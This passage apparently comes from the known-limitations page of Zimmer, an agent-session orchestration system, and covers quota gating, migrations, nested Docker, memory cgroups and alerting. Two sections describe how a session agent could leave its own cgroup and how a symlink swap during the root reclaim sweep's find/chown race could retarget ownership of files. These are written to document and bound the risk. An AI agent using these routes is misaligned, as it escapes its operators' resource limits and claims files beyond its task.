nothing records which of the files on the volume belonged to which turn, so putting the first
turn's screenshot on a later message is the mis-attachment the paragraph above refuses to make.
The session's timeline says when attachments were left behind.

Two things are **failed** rather than restarted, and both are the same trade — a `failed` row is on
the dashboard with a reason on it, a `waiting` one is on nobody's list. A session past
`MAX_RESTARTS` (3) attempts, because whatever is eating its start job is not something more
attempts will fix. And a session stalled longer than `MAX_STALL_AGE` (1 day), because by then the
turn is stale rather than late: session 10426's own PR was merged seven minutes after it was
spawned, so a sweep that found it on day three and simply started it would have run a merge gate
against an already-merged PR. The cost of that second rule is that a genuinely still-wanted turn
older than a day needs a human to press Restart — which is a thing they can now see, rather than a
row nothing was looking at.

---

## A backed-off hold can sleep past the moment it could have started

`SpotSessionHold` doubles the re-check interval on consecutive holds, up to an hour for a
utilization hold and half an hour for a fleet-cap one. The gate is only ever consulted at a
re-check, so a condition that clears early is not noticed until the next one: a session pinned at
the ceiling can sit `waiting` for up to an hour after the pool came back under its target, or up to
half an hour after a slot freed.

This is the deliberate cost of the fix, not an oversight. A flat interval makes the held population
an arrival rate that cannot fall when the deployment is struggling, and on 2026-08-20 that rate —
~80 held sessions re-checking every ~11 minutes — outran the `agents` queue's ability to service it
and grew a GoodJob backlog until it paged. The ceilings are chosen against how fast each condition
can actually clear (a pool window comes down over hours; a slot frees unpredictably, hence the
shorter one), the delay is visible as `spot_hold_retry_at` on the session's detail page, and a human
who wants a specific session now can make it priority.

What would close it properly is waking held sessions on the event rather than polling for it —
publishing a signal when a session ends or a window resets — which is a larger change than the
backoff and is not built.

---

## A spot session has no starvation escape, by design

While a window's non-reserved budget is spent, spot work waits — with no deadline and no override.
The pacing curve makes most waits short (a window merely ahead of pace is back inside it as the clock
moves), but a window whose budget is genuinely gone waits for the rollover, and a week's budget spent
early holds a queue for a long time. That is the behaviour the deployment asked for: the reserve is
what protects priority work, and spending it would defeat the point.

The levers, when one piece of work genuinely cannot wait, are per-session rather than global: promote
that session to priority from its hold banner, or lower the priority reserve on `/inference`. `/inference`
shows the held state, the reason, and how many dollars are left the whole time, so a queue waiting on
a window is visible rather than mysterious.

---

## Quota capacity in dollars is an estimate, not a measurement

`QuotaCapacityCalibrator` divides Zimmer's own Opus-denominated spend over a window by the pool's
average utilization of it. Three approximations ride along: Zimmer's ledger is list-price spend read
from transcripts while Anthropic's counter is its own accounting of the same calls; "the last five
hours of spend" is not exactly "the spend inside each account's own five-hour window", because
accounts reset at different moments; and spend from a transcript Zimmer could not read is missing
from the numerator but present in Anthropic's counter.

The figure is smoothed rather than trusted point to point, every surface labels it an estimate, and
the gate degrades to reasoning in percentages when no usable estimate exists rather than pretending.
But "$412 of spot budget left" is a model output, not a bill, and should be read as one.

---

## The genesis backfill runs in one transaction

`AddGenesisToSessions` does an `add_index` plus four full-table `UPDATE`s — one of them looped up to
ten times over a self-join — inside a single migration transaction, holding a lock on `sessions`
throughout. The lineage passes also filter on `metadata::jsonb->>'forked_from_session_id'`, for which
there is no index. On a small deployment this is a second; on a large `sessions` table it is a
write-blocking pause. It was left transactional
deliberately — a half-applied backfill would leave rows classified by nothing — but a deployment
with a large table should expect the lock.

---

## `sessions.transcript` is the one `json` column left

`config`, `mcp_servers`, `mcp_server_env`, `mcp_server_headers` and `metadata` are `jsonb`, which is
what every other JSON column in the schema is. The conversion took three deploys, described under
[retyping a column](/operate/deploying/#retyping-a-column-the-shadow-takes-the-old-name).

`transcript` is deliberately staying `json`: it is a single opaque blob, never queried by key,
routinely multiple megabytes, and `jsonb` would cost more to write for a document that size. If it
moves it should move out of the row entirely ([#714](https://github.com/tadasant/zimmer/issues/714)).
So the schema still has one `json` column, and that is the intended end state.

Tracked in [#847](https://github.com/tadasant/zimmer/issues/847).

---

## The spot gate holds turns, but not queue position

`SpotSessionHold` gates every turn that would spend Claude quota — a first start, a fired wake
trigger, a follow-up, a poller message, a restart — so while a window sits at its target a
spot-designated session cannot run without being promoted to priority. What it does **not** consult
is `precedence`. The gate answers "is there headroom?", not "is this session next": once the window
falls back below its target, whichever held session's re-check fires first runs, even if it sits at
the bottom of the ranked queue and a hundred higher-ranked sessions are still asleep. Precedence
decides the order in two narrower places — the ceiling sweep's resumes (`SpotSessionPause#rank`) and
the fleet-maintenance session the `quota_available` event spawns — and nowhere else.

The practical effect is that the ranked queue is an ordering over *recovery*, not an admission
queue. A spot session already in flight (one with a wake armed, or a follow-up queued) re-enters
whenever its own timer says so.

Two things still pass the gate, both deliberately: `clone_only` (sets up a clone, spawns no agent)
and `resume_monitoring` (re-attaches to a process already running). Neither spends anything.

One narrow edge comes with returning a refused turn to `waiting`. If the job that reached the gate
had just superseded a dead job whose CLI process was somehow still alive, the session goes dormant
while that process keeps running — and both sweeps that would have noticed
(`CleanupOrphanedSessionsJob#recover_running_orphans` and `SpotSessionPause.pausable_sessions`) scan
`status: running` only, so nothing looks at it until the hold's re-check fires. The gate does not
terminate processes; `SpotSessionPause` is the half of the policy that does.

---

## Genesis backfill cannot recover what was never recorded

The migration that added `sessions.genesis` reconstructs it from `metadata->>'source'`, the
trigger's condition types, and the lineage edge. The new-session form and the REST API never
stamped anything, so pre-migration rows from those two paths are indistinguishable and land on
`unknown` — which classifies **priority**. Old automated work created over the API therefore reads
as priority until it is archived. The failure mode is "runs anyway", which is the right way round,
but the historical counts on the Settings page are not a reliable census of what was automated.

---

## A gate decision appended to the JSON ledger archive never reaches the table

The gate ledgers' JSON files in `tadasant/tadasant-internal` are a frozen archive, and nothing in
Zimmer reads them on a schedule. Each import from them is a
[one-time post-deploy task](/operate/deploying/#one-time-post-deploy-tasks) that reads the archive
once and never again. A gate that falls back to appending its decision there because
`record_gate_decision` errored has written a decision that `search_gate_decisions` will not return
until someone ships another task for it. This has happened once. 52 entries were appended after
the first import, and the 50 that no gate had also recorded live were invisible for a week.
[`ImportGateDecisionsAppendedAfterTheLedgerImport`](/operate/gate-decisions/#the-appends-the-first-import-missed)
is the task written to import them. The archive has had no appends since 2026-09-03.

---

## A zombie WebSocket is not detected on PWA reopen

`stream_visibility_recovery_controller.js` decides whether a reopened page missed anything by
asking `consumer.connection.isOpen()`, which reads `webSocket.readyState`. A socket the browser
never reports as closed — the server went away, or the OS suspended the connection without
tearing it down — still reads as open, so the controller leaves the page alone and does not
re-render it.

The page does not freeze: ActionCable's own connection monitor treats the connection as stale
after ~6s without a ping and reopens it, and `cable-reconnect` re-subscribes any stream source
that stays dark, so live updates resume on their own. What is lost is the backfill — anything
broadcast while the page was away is not recovered until the next navigation.

This is much smaller than it was. When the dead-socket branch ended in a full page reload, a
false *positive* was the expensive mistake and the check had to be conservative:
`connection.monitor.connectionIsStale()` reads stale on every reopen (a frozen page receives no
pings), so adding it would have reloaded every time — the bug the check was written to avoid.
Now that the branch backfills in place, a false positive costs one GET and a few DOM swaps, so
that trade is worth revisiting. It has not been, because on the case that actually matters — iOS
suspending the app — `isOpen()` already reports the socket as closed. A bfcache repro measured
exactly that: socket closed at the moment of restore, every time. The zombie socket is the
residual case, not the common one.

---

## Nothing notices a stopped `devdb` until the next deploy

([#419](https://github.com/tadasant/zimmer/issues/419) — the deploy is now the recovery path on both
destinations; what is left is that nothing else is)

First, the thing that is **not** a limitation, because it keeps being written down as one: no manual
`kamal accessory boot devdb -d production` is owed. Bare `kamal deploy` does not boot accessories,
which is a true Kamal fact, but neither destination deploys with bare `kamal deploy`.
`deploy-staging.yml` runs `kamal accessory boot all -d staging` and the companion repo's
`zimmer-deploy-prod.yml` runs `kamal accessory boot all -d production`, each immediately before its
deploy, unconditionally. An accessory the destination declares gets created by the deploy.

Nor is a stopped `devdb` unrecoverable any more. `kamal accessory boot` is idempotent by *existence*,
not by health: it runs `docker ps -a` per host and skips any host where a container is already there,
and a **stopped** container is still there. Docker's own `--restart unless-stopped`, which is what
Kamal boots accessories with, covers a crash or a daemon restart, and deliberately does *not*
restart a container that was stopped — that exception is what `unless-stopped` names. So booting
alone skips right over one, which is why both destinations now **reboot** `devdb` rather than booting
it, and why re-running the deploy is the recovery path:
[#1054](https://github.com/tadasant/zimmer/pull/1054) added `kamal accessory reboot devdb -d staging`
to `deploy-staging.yml`, and
[tadasant/tadasant-internal#2715](https://github.com/tadasant/tadasant-internal/pull/2715) added
`kamal accessory reboot devdb -d production` to `zimmer-deploy-prod.yml`.

`reboot` is destructive by design — registry login + `docker image pull` + stop + `docker container
prune --filter label=service=zimmer-devdb` + boot — and is therefore scoped to `devdb` alone, on both
destinations. `devdb` is the one accessory declared with no `volumes:` key, holding nothing but
scratch `zimmer_dev_<clone>` databases that `bin/agent-dev` recreates from `schema.rb`. Staging's `db`
holds staging's own data on `zimmer_pgdata`, `redis` holds `zimmer_redisdata`, and widening that one
word to either of them, or to `all`, would take a live service down mid-deploy and move it along its
moving image tag unreviewed. Two tests in two repositories hold that word: this repo's
`test/config/devdb_accessory_test.rb` fails the build if the name rebooted by `deploy-staging.yml` is
ever an accessory that declares a volume, or if production's `devdb` ever gains one, and the companion
repo's `scripts/test-devdb-reboot-scope.sh` fails *its* build if `zimmer-deploy-prod.yml` ever reboots
anything else.

Two costs come with it, both deliberate, on both destinations. The pull is unconditional and raises,
so a deploy now depends on `postgres:16` being pullable — a Docker Hub outage or rate-limit fails the
deploy, loudly, where before it would have been skipped over. And the scratch Postgres follows that
moving tag, patch release by patch release, where staging's `db`, and `redis` on both, stay on
whatever was pulled when they were first created.

The residual gap is that a deploy is the *only* thing that notices. Neither destination
health-checks `devdb` and nothing alerts when it stops, so a `devdb` that goes down mid-session stays
down until the next deploy, and the session that hit it sees only `bin/agent-dev`'s preflight failing
to find Postgres at `zimmer-devdb:5432`. A session cannot repair it either: no host Docker socket is
mounted into the worker, deliberately, since the host socket is root-equivalent
(`test/config/nested_docker_switch_test.rb` asserts its absence for both destinations and with the
nested-Docker switch either way). So the only daemon a session can reach is the worker's own
[nested one](/operate/nested-docker/), which cannot see host accessories, and with nested Docker off,
none at all ([#409](https://github.com/tadasant/zimmer/issues/409)). There is no root either.

How long "until the next deploy" is differs by destination, and staging has the worse end of it.
Production is deployed on every image publish, so any merge to `main` that builds an image recovers
it without anyone deciding to. Two caveats on that: a docs-only merge publishes no image
(`release-image.yml` carries `paths-ignore: ["**/*.md", "docs/**"]`), and the deploy is triggered by a
`repository_dispatch` that `release-image.yml` sends best-effort — it is skipped when the dispatch
repo or token is unset, and a non-2xx only warns, so a publish does not guarantee a deploy.
`Deploy staging` is `workflow_dispatch`-only, so a stopped staging `devdb` stays down until somebody
dispatches a deploy.

---

## A clone sharing the image's bundle cannot install a gem into it

This is the residue of [#410](https://github.com/tadasant/zimmer/issues/410), a larger limitation that is gone. `BundleInstallJob` used to write
`.bundle/config` before the gems it named existed, so an install interrupted partway (a deploy, a
SIGTERM) left the clone pinned to a half-populated `vendor/bundle` — and every Ruby command in it
died with `Bundler::GemNotFound`, listing gems that are plainly installed in the image. The job now
writes that config last, only after `bundle check` confirms the bundle is complete, and it retries
instead of discarding, so an interrupt leaves a clone that is *not installed yet* rather than one
that is broken. See [Background jobs](/operate/background-jobs/).

What remains is the cost of the fast path. When a clone's `Gemfile` and `Gemfile.lock` are
byte-identical to the ones the image was built from — the common case for a clone of this repo —
the job skips the install entirely and points `.bundle/config` at the image's `/usr/local/bundle`,
which already holds every gem in the lockfile. That saves ~300 gem downloads and ~380 MB per clone.
But `/usr/local/bundle/ruby/<version>/gems` is root-owned, and a session runs as `rails`, so the
moment a checkout *changes* the Gemfile, `bundle install` fails with a permission error naming a
path that has nothing to do with the repository.

The recovery is to give the clone a bundle of its own, and `bin/agent-dev` does it for you.
The order matters, because a `BUNDLE_PATH` in `.bundle/config` outranks the environment:
unpin, install, then pin. Pinning first and failing the install second leaves the clone on an
empty `vendor/bundle` — the wedge above, rebuilt by hand.

```bash
bundle config unset --local path
BUNDLE_PATH=vendor/bundle bundle install
bundle config set --local path vendor/bundle
```

An agent that adds a gem and runs a bare `bundle install` sees the permission error first. It is a
loud, specific failure with a one-line fix, which is why it is preferred to re-vendoring 380 MB into
every clone on the chance that one of them will add a gem.

---

## Nested Docker depends on a global, invisible Docker flag

The worker's nested-Docker mode (`ZIMMER_NESTED_DOCKER=1`) cannot start a single container
without `features.time-namespaces: false` in the host's `/etc/docker/daemon.json`. Docker puts
a `time` namespace in every OCI spec it creates and sysbox rejects it, so without the flag even
`docker run --runtime=sysbox-runc alpine echo hi` fails.

The flag is a workaround for [nestybox/sysbox#1011](https://github.com/nestybox/sysbox/issues/1011),
not configuration, and it is worse than a local hack in three ways: it is **global** (every
container on the host loses its own time namespace, not just sysbox ones), it is **invisible**
(not surfaced in `docker info` — only reading `daemon.json` reveals it), and it is
**load-bearing** (remove it and every sysbox container stops starting).

It is inert for Zimmer, which wants no per-container clocks, and it has run without incident.
The risk is a future Docker release changing or dropping the flag, which would present as
"the worker will not start" with nothing pointing at the cause. Tracked for removal once
upstream lands in [#421](https://github.com/tadasant/zimmer/issues/421) — see
[Nested Docker for agent sessions](/operate/nested-docker/).

## Declining needrestart's sysbox restart leaves the daemons on old libraries

`/etc/needrestart/conf.d/99-sysbox.conf` stops `needrestart` restarting `sysbox-mgr` and
`sysbox-fs` after an unattended library upgrade, because that restart empties sysbox's
container registry and permanently orphans every container already running
([#774](https://github.com/tadasant/zimmer/issues/774)). The trade is real and it is not
hidden: the upgraded library is on disk, but the running daemons keep the old one mapped
until something restarts them deliberately. A security fix in one of sysbox's dependencies
therefore does **not** take effect on the daemons at upgrade time — it waits for the next
reboot, or for an operator who restarts sysbox knowing it will cost a worker recreation.
That is the right trade for a host whose containers cannot survive the restart anyway, but it
means "the box is patched" and "the sysbox daemons are patched" are different claims, and
nothing currently reports the second one.

There is also a window on a **new** droplet. Staging's drop-in is converged by `Deploy
staging` (`Keep needrestart from restarting sysbox (converge)`), not by cloud-init — a
snippet in `user_data` could never reach the hosts that already exist, which is every host
that matters. So between a droplet's first boot and the deploy step that converges it, the
box is briefly exposed to exactly this failure. In practice that window is the few minutes
between `terraform apply` and the step, on a box with no worker to orphan yet.

## CI cannot test the nested-Docker path, only the shape of it

CI has no sysbox runtime and no user namespace, so nothing in the suite can start the
worker the way production starts it under `ZIMMER_NESTED_DOCKER=1`. What the suite covers
is the config resolution (`test/config/nested_docker_switch_test.rb`) and the entrypoint's
privilege drop, executed against stubbed `id`/`getent`/`setpriv`
(`test/config/docker_entrypoint_privilege_drop_test.rb`). Both are real assertions, and the
second one fails against the entrypoint that took production down on 2026-08-13 — but
neither is the integrated thing.

This is the gap that let that outage ship: every automated check asserted the worker
container was *shaped* correctly (right runtime, right uid map, inner daemon answering) and
none asserted it was *working*.

The integrated coverage lives in the `Deploy staging` workflow rather than in CI, because
running it needs a sysbox host and CI has none: it preflights the droplet by starting a real
sysbox container, and after the cutover asserts the worker is user-namespaced, has no host
socket, answers `docker version` as uid 1000, and that its `HOME` is `/home/rails` and is
traversable and writable at uid 1000.
That is still a *staging* signal, not a CI one — the suite itself will keep asserting only
the shape, and a `main` that is green says nothing about whether the nested path works.
Production remains off by default and owes its own staging-proven rollout — see
[Nested Docker for agent sessions](/operate/nested-docker/).

---

## A session's memory bound needs the nested-Docker worker

Every agent session runs in its own cgroup with its own `memory.max`
([Each session gets its own memory bound](/sessions/spawning/#each-session-gets-its-own-memory-bound)),
which needs a **writable cgroup2 filesystem**. The worker has one only because sysbox gives
it its own cgroup namespace: under plain runc `/sys/fs/cgroup` is read-only, and on a dev Mac
there is no cgroupfs at all. Nested Docker is also off by default
(`ZIMMER_NESTED_DOCKER` defaults to `0` in `config/deploy.production.yml`), so a deployment
that has not turned it on gets no bound.

Where the bound is unavailable, `SessionMemoryCgroup.available?` is false and every caller
no-ops: sessions spawn exactly as they did before, unbounded, and one runaway command can
still spend the whole container budget. That is deliberate — a failed bound must never be the
thing that stops a session from running — but it means the protection is silently absent
rather than loudly missing. The entrypoint logs one line when it *does* delegate the subtree;
nothing warns when it does not.

Three further gaps in what the bound covers, all by design:

- **It is not a sandbox.** An agent runs as the same uid that owns the delegated subtree, so
  it can move itself out of its own cgroup. This is a guardrail against a runaway command, not
  a boundary against a hostile one — Zimmer has no such boundary anywhere.
- **Inner Docker containers escape it**, and they escape the shared pool too. A container an
  agent starts through the nested `dockerd` is placed in a cgroup by that daemon, which lives
  outside `zimmer.sessions` entirely. Its memory is charged to the worker container, not to the
  session that asked for it and not to the pool
  ([#981](https://github.com/tadasant/zimmer/issues/981)) — which is why the pool is sized to
  leave the dev stacks room under the container cap rather than to account for them.
- **The pool decides who dies, not how much is asked for.** `ZIMMER_SESSIONS_MEMORY_MAX_MB`
  keeps a pile-up of in-budget sessions from reaching the container cap and putting the Rails
  worker in the victim pool. It does not keep the pile-up from happening: at the load that
  produced #981 the pool is exhausted and a session is killed. Nothing holds an
  `AgentSessionJob` claim back on observed memory headroom — admission control was considered
  and not built, because today's telemetry says a headroom gate would be closed for much of
  the day at current demand. `ZIMMER_SESSION_PARALLEL_WORKERS` reduces the demand instead, and
  it is a mitigation rather than a bound.
- **CI cannot test the enforcement**, only the plumbing — same reason as
  [CI cannot test the nested-Docker path](/limitations/#ci-cannot-test-the-nested-docker-path-only-the-shape-of-it).
  The kernel half is verified on staging.

### 🔴 A contained session kill still looks like an incident to the fleet alert

The success case of a per-session bound is a kernel `oom-kill:` line. The fleet's
`fleet_cgroup_oom_kill` alert counts those lines unfiltered, so a session whose runaway command
was killed *inside its own cgroup* — harming nothing, needing no human — pages `#alerts` at
critical exactly like the uncontained container-cap kill the alert was built for.

Measured on staging: two contained kills left the worker container's `memory.current` unchanged
(1.259 GB before, 1.259 GB after) and its `memory.events.local` `oom_kill` at 0, while its
*hierarchical* `memory.events` counted both and the kernel emitted a line for each.

The distinction is in the line itself, which is why the cgroups are named after the session:
`oom_memcg=/zimmer.sessions/sessions/session-12398` is contained,
`oom_memcg=/system.slice/docker-….scope` is not. `oom_memcg=/zimmer.sessions/sessions` — the
shared pool — is a third case: contained in the sense that the Rails worker survives it, and
worth a human's attention in the sense that the box is over-subscribed.

The filter belongs to the alert rule, which lives in the `obs` stack rather than in this
repo, so it is not fixed here — tracked in a private repo. Until it is, expect a page the first
time a production session hits its bound.

---

## `kamal app exec --reuse` runs as root on a nested-Docker worker

`--reuse` is a bare `docker exec` into the running container, so it does not run the image
ENTRYPOINT and it inherits the container's configured user. Under nested Docker that user is
`0:0`, so the command runs as **root** with none of the entrypoint's privilege drop applied.

The image pins `ENV HOME=/home/rails`, so it at least gets a working `HOME` — before that,
any DB-touching command invoked this way died on `could not open certificate file
"/root/.postgresql/postgresql.crt": Permission denied`, which reads as a broken deploy rather
than as the wrong invocation. What the pin does *not* do is make the command run as uid 1000.

So anything invoked this way that writes under `~` — `~/.zimmer/clones`, `~/.claude`,
`~/.config/gh`, `~/.local`, `~/.codex` — writes **root-owned files into named volumes the app
reads at uid 1000**. Previously those writes landed in `/root` on the container layer and
evaporated at the next deploy; now they persist. That is a real trade, taken deliberately: a
working admin path with a caveat beats one that always fails.

The damage does not accumulate: the entrypoint sweeps the volume roots and hands anything not owned by uid 1000 back to it — once before the privilege drop, then every 60 seconds from a process that kept its root credentials for exactly that. What remains is a **window**: a file root writes is unreadable to the app until the next sweep. `ZIMMER_RECLAIM_INTERVAL` tunes it (`0` drops the repeat and keeps the boot sweep), but no destination passes that variable today, so changing it means adding it to `env: clear:` in the deploy config rather than setting it at deploy time.

Use plain `kamal app exec` (a `docker run`, which runs the entrypoint and drops properly), or
`docker exec -u 1000:1000` if you need the app's identity inside the existing container — see
[Nested Docker for agent sessions](/operate/nested-docker/#the-entrypoint-reclaims-what-root-leaves-behind).

---

## The dev stack writes as root, and only the worker undoes it

`.agent-containers/docker-compose.dev.yml` runs its `app` service as root — `Dockerfile.dev`
sets no `USER` — and bind-mounts `..:/app`, `${HOME}/.claude` and `${HOME}/.config/gh` into
it. Everything the stack writes through those mounts is therefore root-owned on the other
side, whoever started it.

That, not `kamal app exec --reuse`, is what actually produced the root-owned session
transcripts found in staging's `claude_home` volume, and the 4,442 root-owned
`tmp/cache/bootsnap/` files that made `ac.sh destroy`'s clone removal fail for the uid
sessions run as.

The entrypoint's reclaim sweep covers this on a nested-Docker worker, because the clone and the runtime homes are under the volume roots it sweeps. It does **not** cover a dev stack started anywhere else — on a laptop there is no root process sweeping afterwards, so a stack run there still leaves files its own user cannot delete. Fixing the source means running the `app` service as uid 1000, which is a change to the dev image (bundle path, the Claude CLI's install prefix, and the docker socket's group). Tracked in [#510](https://github.com/tadasant/zimmer/issues/510).

---

## The reclaim sweep re-resolves paths it already looked at

The sweep collects paths with `find` and then hands them to `chown` in a second step, so an intermediate directory component can be swapped between the two. `~/.zimmer/clones` is writable by uid 1000 by construction, so an agent could plant a path the sweep will match, then replace one of its parent directories with a symlink before `chown -h` resolves it — retargeting a file outside the volume to `rails:rails`. The repeat makes the race retryable rather than one-shot.

`-h` closes the same trick on the final component, and the bound on the rest is the role's existing privilege rather than anything the sweep does: on a nested-Docker worker uid 1000 already holds the inner Docker socket and is therefore already equivalent to container root, which sysbox keeps namespaced away from the host. So this grants no capability that role did not have. It would matter on a container started as root under plain `runc` with `ZIMMER_NESTED_DOCKER` unset — a combination the deploy configs cannot produce, because runtime and user are derived from the same variable, and the one case where this PR also leaves a root shell loop running for the container's lifetime where previously root `exec`'d itself away.

---

## A PR session waits for a merge message that three cases can prevent

The PR goals hold a session open until its PR merges — asleep in `waiting` on the `open-pr` skill's
bounded self-wake, then at rest in `needs_input` — and `Github::PrStatusEvaluator` releases it by
delivering `AutomatedPrompts.pr_merged_message`. That is the whole exit condition, and it has three
ways to not fire.

**The PR URL was never recorded.** The poller iterates `Session.with_github_prs`, which needs
`custom_metadata["github_pull_request_urls"]` populated, and that is filled by
`TranscriptHooks::GithubPrUrlHook` — a deliberately tight heuristic over the transcript. A PR
opened through a wrapper script, a subagent whose tool calls do not reach the main transcript, an
MCP tool on a Pi session (where every server is called through one proxy tool), or against a
different repository than the session's own (the `same_repo?` gate) records nothing. `warn_if_pr_goal_captured_no_url` notices and writes a
session-timeline warning, but nothing the agent reads. The prompt and the goal text both tell the
agent to check `get_session` and archive if no URL was recorded, which is an instruction, not a
guarantee.

**The poller never saw the PR open.** The announcement fires only on an observed open → merged
transition (`status == "merged" && current_statuses[pr_url] == "open"`). `PollBackoff` stretches
the per-session interval to 5 minutes and then 30 minutes based on time since the last *human*
activity — which for a router-spawned session counts from `created_at`. A merge gate that merges
inside that window can land the PR before the poller ever recorded it as open, and the session
waits forever. The window is bounded at 30 minutes rather than 24 hours, because a PR url with no
recorded status counts as unresolved and so takes the same cap a PR recorded as `open` does — but
bounded is not closed. Documented from the poller's side in
[background jobs](/operate/background-jobs/).

**The delivery threw.** A failed `deliver_follow_up!` is swallowed while the status write advances
past the transition, so the message is never retried.

Before the session archived on labeling, each of these left a stale session. Now each leaves a
permanent one. The recovery in every case is the same: the human archives it, or sends it a
follow-up.

There is a fourth, milder consequence on the other side of the merge. Archiving drops a session out
of `with_github_prs`, so comments left on the PR *after* it merges reach nobody. That is intended —
the work is done — but it means a post-merge question on the PR needs the session unarchived to be
answered.

---

## A lane wedged on jobs it already claimed pages only once work stacks up behind it

The queue-backlog thresholds measure ready work — jobs due now and unclaimed — and deliberately
ignore the `claimed` population, because a claimed job is one a worker is executing rather than one
that is waiting. See [What "queue backlog" counts](/operate/background-jobs/#what-queue-backlog-counts).

The `wedged_lane` branch reads the claimed side directly and covers the common case: a lane whose
whole thread pool is held past what its own jobs can explain, with ready work stacked behind it. It
is deliberately conditioned on that ready work, because a full pool with an empty lane behind it is
a lane doing its job and there is nothing being starved to report.

Two shapes are left uncovered.

**A wedge on a genuinely idle lane.** A worker that wedges while holding claimed jobs on a queue
with no further inflow produces a `claimed_count` that never falls and a `ready_count` that never
rises, so neither the ready thresholds nor `wedged_lane` fires.
`oldest_claimed_age_seconds_by_queue` measures it — the number is on `/health`, in
`GET /api/v1/health` and in `get_system_health` — but nothing pages on it alone, because an old
execution on an idle lane is indistinguishable from a long job that is running perfectly well, and
`agents` holds threads for the whole life of a session as a matter of routine.

**A lane the worker has stopped polling.** `wedged_lane` requires claims to exist, so the opposite
failure — ready work piling up with *zero* claims on the lane behind a live worker — still pages
only through the ready-side branches at their depth thresholds, which for `inference` means 150 deep
and an hour old. The data to close it is now measured (`claimed_count_by_queue` absent for a lane
that has ready work, beside a live `active_workers`); the branch is not written.

In practice inflow is what makes a wedged worker visible: Zimmer's queues are fed by cron pollers
and by sessions, so a stuck lane normally accumulates ready work within a poll interval.
`GoodJob::Process::EXPIRED_INTERVAL` also bounds the whole-worker case — GoodJob reaps a process
that stops renewing its heartbeat and releases the jobs it held, which returns them to `ready`.

Only `agents` carries no execution ceiling as a deliberate choice — `AgentSessionJob` holds its
thread for the unbounded life of a session, so no execution age there means anything — and a wedge
in `agents` is therefore invisible to this gate by construction. Any queue nobody has sized in
`LANE_EXECUTION_CEILINGS` inherits the same exemption by accident rather than by design; a test
asserts every configured lane except `agents` has one, so adding a queue without a ceiling fails CI
rather than going quiet.

---

## A metadata search matches Postgres's key order, so a two-key fragment is unreliable

`quick_search_sessions`, the REST search and the dashboard match the session JSON as text, and
since [#930](https://github.com/tadasant/zimmer/issues/930) that text is rendered through `jsonb`
so it is the same whichever of Zimmer's two metadata writers touched the row last. `jsonb` orders
an object's keys by length, then bytewise — not in the order the writer wrote them. So a query
fragment that spans the comma **between** two keys only matches if the caller happened to spell
them in Postgres's order:

```
stored:  {"zebra": "1", "clone_path": "/tmp/x", "agent_root_key": "zimmer-router"}

"clone_path": "/tmp/x", "agent_root_key": "zimmer-router"   -> matches
"agent_root_key": "zimmer-router", "clone_path": "/tmp/x"   -> does not
"agent_root_key": "zimmer-router"                           -> matches
zimmer-router                                               -> matches
```

Search **one** key/value pair, or a bare value, which is what the tool's own description already
tells you to do — those are unaffected by ordering, in either spelling. A two-key fragment was
never dependable (before #930 it matched or not depending on the writer); it is now dependably one
way, which is worth knowing rather than rediscovering.

Fixing it properly would mean matching each pair independently, which is the per-word OR-ing that
#405 rejected: it turns a precise answer into a shortlist the caller has to re-grep by hand.

---

## Transcript content search is bounded, so an empty answer can mean "not yet"

No index helps a leading-wildcard `ILIKE`, so searching transcripts is a sequential scan that
detoasts every one it passes — thousands of sessions and gigabytes of TOAST on production. Run as one
statement it raced kamal-proxy's 30-second timeout and returned a 504 about as often as results
([#405](https://github.com/tadasant/zimmer/issues/405)).

Moving the transcript into `session_transcript_chunks` ([#110](https://github.com/tadasant/zimmer/issues/110))
relieved this rather than fixing it: the predicate is now an `EXISTS` over the chunk table, which can
stop at the first matching chunk instead of detoasting a whole 32 MB conversation to find a phrase in
its first megabyte, but an unindexed scan over the corpus is still an unindexed scan over the corpus.
It also carries two small semantic changes, both of which make matching more truthful and both of
which could change an existing query's answer. Chunks are cut at line breaks, so a phrase spanning
the newline *between* two JSON events no longer matches — that newline is a record separator rather
than anything a person typed, so the fragments it used to match were nonsense. And the chunk half
matches the **raw** JSONL where the legacy column matched it JSON-*encoded*: `transcript::text` on a
`json` column renders the document as a string literal, quoted and backslash-escaped, so a query
containing a `"` used to have to match the `\"` in it. Against a chunk, a `"` is a `"`. Until
`BackfillSessionTranscriptChunks` finishes, a corpus can hold both spellings, so a quote-bearing
query can match some sessions and not others for no reason a caller can see.

`SessionContentSearch` bounds it instead: candidates newest-first, in chunks, stopping at the result
limit or a wall-clock budget (20s by default, `ZIMMER_CONTENT_SEARCH_BUDGET_SECONDS`), always
returning. The cost is that a search over a large corpus may not reach the end in one call. That is
reported rather than hidden — `complete: false` plus a `next_cursor` to resume with — but a caller
that ignores the flag will read an empty page as "no such session".

The proper fix is an index the search can use, and both candidates have a real obstacle: a `pg_trgm`
GIN index would be built over gigabytes of TOASTed text, and `to_tsvector` refuses documents over
1 MB, which most transcripts exceed. Neither can be sized or measured from this repository — the
managed Postgres is not reachable from an agent session — so the bounded scan is what ships until
someone can measure them on the real corpus.

---

## A runaway job presents as a dead droplet, not as a dead job

Staging is a 4 GB droplet with no swap, and the worker is the one role running work whose peak
allocation is a function of the data it touches. `TranscriptArchiveJob` is such a job, and on
staging it allocates around 2.8 GB every ten minutes
([#495](https://github.com/tadasant/zimmer/issues/495)): with no archive on disk it treats every
session as changed and loads all of their transcripts at once, then dies before writing the archive
that would have made the next run cheap. It cannot bootstrap, so it retries forever.

Both reasons there was never an archive on disk have since been removed. The job used to write under
`Rails.root/storage`, a container overlay layer that every deploy destroys, so even a run that *did*
finish left nothing for the next one to build on; it now writes under `~/.zimmer/transcript_archives`,
on the `zimmer_data` volume, which survives deploys
([#714](https://github.com/tadasant/zimmer/issues/714)). And the first build no longer has to fit in
memory: the job loads one session at a time rather than materializing every changed session at once,
and archives at most `MAX_SESSIONS_PER_RUN` of them per tick, writing its metadata for the slice it
finished ([#719](https://github.com/tadasant/zimmer/issues/719)). A run that does not get through the
backlog now leaves the next one less to do, which is the property the bootstrap always lacked.

The failure that follows is worth knowing by shape, because it misdirects. The allocation exhausts
the host, so the kernel declares a *global* out-of-memory condition and takes victims across every
cgroup — not just the offender's. sshd and Caddy lose their working set, and the droplet stops
answering SSH on 2222 and HTTPS on 443 at the same moment. From outside, that is indistinguishable
from a droplet that is down, rebooting, or wedged; DigitalOcean meanwhile reports it `active` with
no power events, because nothing about the virtual machine has changed. The app is fine throughout.
`/up` answers 200 in under a tenth of a second the moment the pressure lifts.

Staging's worker carries `memory: 2g` (`config/deploy.staging.yml`). That does not prevent the
runaway; it confines it. The kill lands in the worker's cgroup, the worker restarts under
`unless-stopped`, and sshd stays up — which is the property that matters, because the alternative is
an outage nobody can log in to diagnose. It does not make the queue usable, though: a worker
restarting every ten minutes is a queue that never drains.

